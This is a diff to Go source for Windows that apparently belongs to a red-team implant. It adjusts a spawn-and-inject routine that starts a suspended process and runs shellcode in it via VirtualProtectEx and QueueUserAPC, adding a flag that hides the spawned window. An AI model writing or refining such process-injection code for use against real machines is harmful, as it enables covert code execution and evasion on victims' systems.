@@ -154,7 +154,7 @@ func spawnTempProcess(procInfo *windows.ProcessInformation, startupInfo *windows
 		program, args = getSpawnProcessX86()
 	}
 
-	errCreateProcess := createProcessNative(windows.StringToUTF16Ptr(program), windows.StringToUTF16Ptr(args), nil, nil, true, windows.CREATE_SUSPENDED, nil, nil, startupInfo, procInfo, ignoreToken)
+	errCreateProcess := createProcessNative(windows.StringToUTF16Ptr(program), windows.StringToUTF16Ptr(args), nil, nil, true, windows.CREATE_NO_WINDOW|windows.CREATE_SUSPENDED, nil, nil, startupInfo, procInfo, ignoreToken)
 	if errCreateProcess != nil && errCreateProcess != windows.SEVERITY_SUCCESS {
 		currentPid = 0
 		return errors.New(fmt.Sprintf("CreateProcess error: %s", errCreateProcess.Error()))
@@ -172,8 +172,9 @@ func SpawnAndInjectDll(dll []byte, isDllX64 bool, ignoreToken bool) error {
 		return err
 	} else {
 		procInfo := &windows.ProcessInformation{}
+		// seems dwCreateFlag value cannot be put at here
 		startupInfo := &windows.StartupInfo{
-			Flags:      windows.STARTF_USESTDHANDLES | windows.CREATE_SUSPENDED,
+			Flags:      windows.STARTF_USESTDHANDLES,
 			ShowWindow: 1,
 		}
 		err := spawnTempProcess(procInfo, startupInfo, isDllX64, ignoreToken)
@@ -207,7 +208,6 @@ func callUserAPC(processHandle windows.Handle, threadHandle windows.Handle, shel
 	if errVirtualProtectEx != nil && errVirtualProtectEx != windows.SEVERITY_SUCCESS {
 		return errors.New(fmt.Sprintf("VirtualProtectEx error: %s", errVirtualProtectEx))
 	}
-	// TODO ptr plus
 	_, _, err := queueUserAPC.Call(addr+uintptr(offset), uintptr(threadHandle), 0)
 	if err != nil && errVirtualProtectEx != windows.SEVERITY_SUCCESS {
 		return errors.New(fmt.Sprintf("QueueUserAPC error: %s", err))
